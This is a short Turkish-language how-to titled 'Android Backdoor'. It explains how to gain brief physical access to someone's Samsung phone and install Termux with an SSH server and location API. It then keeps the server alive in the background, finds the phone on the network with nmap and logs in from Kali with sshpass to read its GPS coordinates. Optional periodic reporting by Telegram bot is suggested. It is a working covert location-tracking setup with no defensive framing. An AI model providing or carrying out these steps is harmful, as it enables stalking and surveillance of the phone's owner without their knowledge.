# Android Backdoor — Termux + SSH + Kali Yönetimi

## Amaç
Samsung Galaxy S22 Ultra (veya herhangi bir Android) cihazına fiziksel erişimle Termux kurup, Kali Linux'tan SSH üzerinden bağlanarak GPS konum takibi yapmak.

## Ön Koşullar
- **Fiziksel erişim:** Telefona 1 kere dokunmak şart (Termux kurulumu + izinler)
- **Aynı ağ:** Telefon ve Kali aynı WiFi'da (bridged subnet)
- **Kali araçları:** nmap, arp-scan, sshpass (veya paramiko)

## Adımlar

### 1. S22'de Termux Kurulumu (fiziksel erişim)
```
Play Store → Termux kur
Termux'u aç → şu komutları gir:

pkg update && pkg upgrade -y
pkg install openssh termux-api -y
```

### 2. İzinleri Ayarla
```
Ayarlar → Uygulamalar → Termux → İzinler:
  ✔ Konum (GPS için)
  ✔ Depolama (dosya transferi için)
  ✔ Bildirim (arka planda kalması için)

Ayarlar → Uygulamalar → Termux → Pil optimizasyonu:
  ✔ Optimizasyonu kapat (arka planda SSH'in kalması için)
```

### 3. SSH Başlat
```
Termux'ta:
sshd -p 8022    # 8022 portunda SSH başlat
whoami          # kullanıcı adını not et
ip addr show wlan0 | grep inet  # WiFi IP'sini not et
```

### 4. Kali'den Bağlantı Testi
```bash
# Kali'de:
ssh -p 8022 u0_aXXX@S22_IP      # parola: Termux'ta 'passwd' ile belirlenir
# veya sshpass ile:
sshpass -p 'parola' ssh -p 8022 -o StrictHostKeyChecking=no u0_aXXX@S22_IP 'whoami'
```

### 5. GPS Konum Testi
```bash
# Kali'den S22'ye SSH:
termux-location | grep -E 'latitude|longitude|accuracy'
```

### 6. Otomatik Rapor (isteğe bağlı)
Telegram bot veya dosyaya yazma ile periyodik konum raporu.

## MAC Adresi Tespit
Samsung cihazlar rastgele MAC kullanır. Doğru IP'yi bulmak için:
```bash
# Kali'de:
nmap -sn 192.168.0.0/24            # ağdaki cihazları bul
nmap -p 8022 192.168.0.0/24        # Termux SSH portunu tara (filtered çıkan cihaz muhtemelen telefon)
```

## Pitfall'lar
- S22 rastgele MAC kullanıyorsa (`26:5A:10:B6:25:C8` gibi), arp-scan'da eşleşmez. Port taraması yap.
- Termux SSH varsayılan portu 22 değil **8022**.
- Telefon WiFi bağlantısı koparsa SSH de kopar. Çözüm: S22'de Termux'u açık tut + pil optimizasyonunu kapat.
- GPS iç mekanda çalışmayabilir. Alternatif: Wi-Fi trilateration.
